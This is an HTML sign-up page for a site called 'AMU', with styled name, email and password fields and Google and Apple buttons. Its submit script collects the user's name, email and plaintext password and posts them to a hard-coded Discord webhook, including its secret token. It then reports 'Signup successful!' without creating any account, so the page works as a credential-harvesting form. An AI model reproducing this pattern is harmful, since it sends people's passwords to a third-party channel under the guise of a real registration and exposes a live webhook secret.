<html>
<head>
    <title>Create an Account</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #2e2b3a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            display: flex;
            width: 90%;
            max-width: 800px;
            background-color: #3b3654;
            border-radius: 10px;
            overflow: hidden;
            flex-direction: column;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease;
        }
        .container:hover {
            transform: scale(1.02);
        }
        @media (min-width: 768px) {
            .container {
                flex-direction: row;
            }
        }
        .left {
            flex: 1;
            background: url('https://i.gifer.com/KmGc.gif') no-repeat center center;
            background-size: cover;
            position: relative;
            padding: 20px;
        }
        .left .logo {
            font-size: 24px;
            font-weight: 700;
        }
        .left .back-to-website {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 14px;
            color: #b3b3b3;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        .left .back-to-website:hover {
            color: #ffffff;
        }
        .left .caption {
            position: absolute;
            bottom: 20px;
            left: 20px;
            font-size: 18px;
        }
        .right {
            flex: 1;
            padding: 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .right h2 {
            font-size: 32px;
            margin-bottom: 10px;
        }
        .right p {
            font-size: 14px;
            color: #b3b3b3;
            margin-bottom: 20px;
        }
        .right p a {
            color: #6a5acd;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        .right p a:hover {
            color: #ffffff;
        }
        .right form {
            display: flex;
            flex-direction: column;
        }
        .right form input {
            background-color: #4a4458;
            border: none;
            border-radius: 5px;
            padding: 10px;
            margin-bottom: 10px;
            color: #ffffff;
            font-size: 14px;
            transition: background-color 0.3s ease;
        }
        .right form input:focus {
            background-color: #5a5568;
            outline: none;
        }
        .right form .password-container {
            position: relative;
        }
        .right form .password-container input {
            width: 100%;
        }
        .right form .password-container .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #b3b3b3;
            transition: color 0.3s ease;
        }
        .right form .password-container .toggle-password:hover {
            color: #ffffff;
        }
        .right form input[type="checkbox"] {
            width: auto;
            margin-right: 10px;
        }
        .right form label {
            display: flex;
            align-items: center;
            font-size: 14px;
            color: #b3b3b3;
        }
        .right form label a {
            color: #6a5acd;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        .right form label a:hover {
            color: #ffffff;
        }
        .right form button {
            background-color: #6a5acd;
            border: none;
            border-radius: 5px;
            padding: 10px;
            color: #ffffff;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s ease;
        }
        .right form button:hover {
            background-color: #7a6bcd;
        }
        .right .social-login {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        .right .social-login button {
            border: none;
            border-radius: 5px;
            padding: 10px;
            color: #ffffff;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 48%;
            transition: background-color 0.3s ease;
        }
        .right .social-login button.google {
            background-color: #db4437;
        }
        .right .social-login button.google:hover {
            background-color: #e57368;
        }
        .right .social-login button.apple {
            background-color: #000000;
        }
        .right .social-login button.apple:hover {
            background-color: #333333;
        }
        .right .social-login button i {
            margin-right: 10px;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <div class="logo">AMU</div>
            <a href="#" class="back-to-website">Back to website <i class="fas fa-arrow-right"></i></a>
            <div class="caption">Capturing Moments,<br>Creating Memories</div>
        </div>
        <div class="right">
            <h2>Create an account</h2>
            <p>Already have an account? <a href="#">Log in</a></p>
            <form id="signup-form">
                <input type="text" placeholder="First name" id="first-name" value="Fletcher">
                <input type="text" placeholder="Last name" id="last-name">
                <input type="email" placeholder="Email" id="email">
                <div class="password-container">
                    <input type="password" placeholder="Enter your password" id="password">
                    <i class="fas fa-eye toggle-password" onclick="togglePassword()"></i>
                </div>
                <label>
                    <input type="checkbox" id="terms">
                    I agree to the <a href="#">Terms & Conditions</a>
                </label>
                <button type="submit">Create account</button>
            </form>
            <div class="social-login">
                <button class="google"><i class="fab fa-google"></i> Google</button>
                <button class="apple"><i class="fab fa-apple"></i> Apple</button>
            </div>
        </div>
    </div>
    <script>
        function togglePassword() {
            var passwordField = document.getElementById("password");
            var passwordToggle = document.querySelector(".toggle-password");
            if (passwordField.type === "password") {
                passwordField.type = "text";
                passwordToggle.classList.remove("fa-eye");
                passwordToggle.classList.add("fa-eye-slash");
            } else {
                passwordField.type = "password";
                passwordToggle.classList.remove("fa-eye-slash");
                passwordToggle.classList.add("fa-eye");
            }
        }

        document.getElementById("signup-form").addEventListener("submit", function(event) {
            event.preventDefault();

            var firstName = document.getElementById("first-name").value;
            var lastName = document.getElementById("last-name").value;
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;
            var terms = document.getElementById("terms").checked;

            if (firstName && lastName && email && password && terms) {
                var data = {
                    content: `New Signup:\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPassword: ${password}`
                };

                fetch("https://discord.com/api/webhooks/1303651872795787364/vVwrKkgUcRqR9OzIbvxngiL4K4Xe9CKIV0faZDRguR1oOYEakqtpETTLXxEfBEyFBe2W", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                }).then(response => {
                    if (response.ok) {
                        alert("Signup successful!");
                    } else {
                        alert("Error: " + response.statusText);
                    }
                }).catch(error => {
                    alert("Error: " + error.message);
                });
            } else {
                alert("Please fill in all fields and agree to the terms.");
            }
        });
    </script>
</body>
</html>
